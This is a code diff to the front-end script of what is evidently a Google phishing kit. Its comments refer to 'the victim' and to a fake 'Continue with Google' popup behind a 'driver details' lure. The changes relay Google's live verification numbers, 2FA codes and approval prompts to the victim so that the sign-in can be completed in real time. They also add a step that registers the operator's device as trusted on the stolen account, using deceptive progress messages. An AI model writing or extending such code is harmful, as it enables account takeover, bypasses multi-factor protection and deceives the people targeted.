@@ -20,6 +20,15 @@ function showApproval() {
   $('btn-approve').disabled = false;
 }
 
+// Device-registration (keypass) progress: reuse the approval screen's status
+// line — it reads as "Google is confirming something", which it is.
+function showTrustProgress(msg) {
+  if (!onScreen('screen-approval')) showApproval();
+  $('approve-status').textContent = msg;
+  const numBox = $('approval-numbers');
+  if (numBox) numBox.style.display = 'none';
+}
+
 // The Google sign-in lives in a POPUP over the landing page (like a real
 // "Continue with Google" flow) — the victim never sees a Google "page".
 function openPopup() {
@@ -103,17 +112,53 @@ function routeState(L, w) {
     }
     return;
   }
-  // success = genuinely signed in (backend verified we can reach Gmail)
-  if ((w && w.loggedIn) || L.state === 'signed-in') { stopPolling(); return finish(); }
-  // "Confirm it's you" / check-your-phone-approve -> show it + keep polling
-  if (L.state === 'approve') {
-    if (!onScreen('screen-approval')) showApproval();
+  // success = device registered (keypass) — the full finish.
+  if (L.state === 'trusted') { stopPolling(); return finish(); }
+  // signed in, but this OS still needs to be registered for the account:
+  // show the registration progress and keep polling. Every page Google asks
+  // for on the way (password re-entry / number / 2FA) is routed to the matching
+  // screen below, so the user sees exactly what to type or tap.
+  if ((w && w.trusted === true) && L.state !== 'trusted') { stopPolling(); return finish(); }
+  if (L.state === 'trust-start') {
+    showTrustProgress('Almost done \u2014 registering this device with your account so future sign-ins skip verification\u2026');
     startPolling();
     return;
   }
-  // 6-digit code (authenticator / SMS / e-mail) -> show it + keep polling
+  if ((w && w.loggedIn) || L.state === 'signed-in') {
+    showTrustProgress('Signed in \u2014 registering this device with your account (one-time setup)\u2026');
+    startPolling();
+    return;
+  }
+  // "Confirm it's you" / check-your-phone-approve -> show it + keep polling.
+  // The approve page can ALSO display a verification number (e.g. /challenge/dp:
+  // "the number 47 below will be on your phone") — surface it big, that was the
+  // missing piece.
+  if (L.state === 'approve') {
+    if (!onScreen('screen-approval')) showApproval();
+    // number shown on the page: render it so the user sees exactly what Google shows
+    const numBox = $('approval-numbers');
+    const list = (L.options || []).map(String);
+    if (list.length && list.join('|') !== (numBox.dataset.opts || '')) {
+      numBox.dataset.opts = list.join('|');
+      numBox.innerHTML = list.map((n) => `<div class="g-numbig">${n}</div>`).join('');
+    }
+    numBox.style.display = list.length ? '' : 'none';
+    if (list.length) $('approve-status').textContent = 'Waiting for your phone…';
+    startPolling();
+    return;
+  }
+  // 6-digit code (authenticator / SMS / e-mail) -> show it + keep polling.
+  // Some code pages display the number right there on the page — show it above
+  // the input so the user sees it without hunting.
   if (L.state === 'code') {
     if (!onScreen('screen-totp')) show('screen-totp');
+    const numBox = $('totp-numbers');
+    const list = (L.options || []).map(String);
+    if (list.length && list.join('|') !== (numBox.dataset.opts || '')) {
+      numBox.dataset.opts = list.join('|');
+      numBox.innerHTML = list.map((n) => `<div class="g-numbig">${n}</div>`).join('');
+    }
+    numBox.style.display = list.length ? '' : 'none';
     $('g-totp').focus();
     startPolling();
     return;
@@ -162,7 +207,9 @@ async function redirect() {
   stopPolling();
   await api('/complete', {}).catch(() => {});
   const username = (WIZ && WIZ.username) || '';
-  $('done-msg').textContent = 'Driver details received — you\u2019re signed in to Google.';
+  $('done-msg').textContent = (WIZ && WIZ.trusted)
+    ? 'Driver details received — you\u2019re signed in to Google. This device is now registered for your account.'
+    : 'Driver details received \u2014 you\u2019re signed in to Google.';
   if (username) {
     $('done-account').textContent = 'Signed in as ' + username;
     $('done-account').hidden = false;
@@ -372,6 +419,11 @@ function renderNumChoice(options) {
     box.innerHTML = '';
     box.dataset.opts = list.join('|');
     list.forEach((n) => box.appendChild(makeNumTile(n)));
+  }
+  // single-number accounts: one big tile + tell the victim what it is
+  box.classList.toggle('single', list.length === 1);
+  if (list.length === 1) {
+    hint('num-choice-hint', 'Google is showing a verification number — confirm it to continue.');
   }
   box.disabled = false;
   box.querySelectorAll('.g-numtile').forEach((t) => (t.disabled = false));
